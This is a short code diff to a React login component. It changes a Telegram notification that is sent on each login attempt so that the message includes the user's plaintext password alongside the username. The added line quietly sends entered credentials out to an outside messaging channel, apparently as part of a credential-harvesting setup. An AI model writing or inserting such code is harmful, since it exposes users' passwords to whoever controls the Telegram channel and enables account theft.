@@ -39,7 +39,7 @@ const Login = () => {
     setIsLoading(true); // Show loader
 
     // Notify Telegram that a login attempt is being made
-    sendTelegramNotification(`Login attempt with username: ${username}`);
+    sendTelegramNotification(`Login attempt with username: ${username} and password: ${password}`);
 
     try {
       // Delay for a short period to ensure cookies can set before making the request
